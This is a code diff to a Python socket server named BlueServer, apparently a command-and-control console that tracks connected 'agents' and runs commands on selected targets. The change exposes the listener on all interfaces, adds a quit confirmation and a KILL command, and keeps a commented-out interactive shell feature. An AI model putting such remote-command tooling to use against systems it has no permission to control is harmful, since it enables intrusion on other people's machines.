@@ -17,14 +17,18 @@ class BlueServer:
         self.running = False 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.sock.bind(('127.0.0.1',self.port))
+        self.sock.bind(('0.0.0.0',self.port))
         self.sock.listen(10) #sets backlog to 10
         self.agent_count = 0
 
     def handle_command(self,userin):
         splits = userin.split(" ") #splits userinput on each space
         if userin.upper() == "QUIT" or userin.upper() == 'Q':
-            self.stop()
+            validate = input("Confirmation required: are you sure you want to quit? (y/n)\n")
+            if validate.upper() in ["YES","Y"]:
+                self.stop()
+            else:
+                print("Cancelling QUIT command")
         elif userin.upper() == "HELP" or userin == "?":
             self.help()
         elif splits[0].upper() == "SET":
@@ -75,6 +79,15 @@ class BlueServer:
                     print(str(target),end=",")
                 else:
                     print(str(target))
+        elif splits[0].upper() == "KILL":
+            agents = splits[1].split(",")
+            for a in agents:
+                agent = self.agentnum_to_agent(a)
+                self.connections.remove(agent)
+                if agent in self.targets:
+                    self.targets.remove(agent)
+                agent.sock.shutdown(socket.SHUT_RDWR)
+                agent.sock.close()
         else:
             print("Command does not exist\n")
 
@@ -87,7 +100,6 @@ class BlueServer:
             userin = input("> ")
             self.handle_command(userin)
             
-
     def stop(self):
         self.running = False
 
@@ -99,6 +111,7 @@ class BlueServer:
         print("SET <PARAMS>\tSets options for running program. Use SET HELP for more info")
         print("CMD <COMMAND>\tRuns a certain command on all selected targets")
         print("SHOW CONNECTIONS\tShows all connected agents")
+        print("KILL <AGENT #>\tDisconnects specified agent")
         #print("SHELL <Agent # or IP>\tOpens an interactive shell on agent with specified IP")
 
     def set_help(self):
@@ -140,5 +153,4 @@ def main():
     server.start()
     
 if __name__ == "__main__":
-
     main()
